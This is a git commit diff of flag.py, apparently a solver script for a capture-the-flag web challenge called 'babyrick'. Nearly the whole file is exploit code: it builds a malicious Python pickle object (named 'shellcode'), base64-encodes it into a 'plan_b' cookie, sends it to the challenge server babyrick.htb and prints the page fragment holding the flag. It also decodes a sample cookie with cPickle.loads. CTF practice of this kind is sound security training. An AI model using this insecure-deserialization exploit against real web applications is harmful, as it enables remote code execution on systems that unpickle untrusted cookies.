b3e67dae86da5b8e17976efd5b78c71caa052816
ongyuann <32030081+ongyuann@users.noreply.github.com>
2021-02-14 11:05:28 +0800

    Update flag.py

--- challenges/web/babyrick/flag.py
+++ challenges/web/babyrick/flag.py
@@ -14,18 +14,18 @@ def serialize_exploit():
 
 '''
 if __name__ == "__main__":
-    #cookie = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"
-    #serialized = base64.b64decode(cookie)
-    #anti_pickle_serum = Exploit
-    #deserialized = _pickle.loads(serialized)
-    #print (deserialized)
+    cookie = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"
+    serialized = base64.b64decode(cookie)
+    anti_pickle_serum = Exploit
+    deserialized = cPickle.loads(serialized)
+    print (deserialized)
     
-    plan_b = base64.b64encode(serialize_exploit())
-    print (plan_b.decode("utf-8"))
+    #plan_b = base64.b64encode(serialize_exploit())
+    #print (plan_b.decode("utf-8"))
 
     pass
 '''
-
+#'''
 def get_plan_b():
     shellcode = cPickle.dumps({"serum": Exploit()}, protocol=0)
     #print(shellcode)
@@ -40,12 +40,11 @@ def send():
 
     burp0_url = "http://babyrick.htb:32238/"
     burp0_cookies = {"plan_b": "%s" % get_plan_b()}
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
-    burp0_data = {}
-    r = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
     
+    r = session.get(burp0_url, cookies=burp0_cookies)
     soup = BeautifulSoup(r.text,features="html.parser")
     print (soup.span)
     pass
 
 send()
+#'''
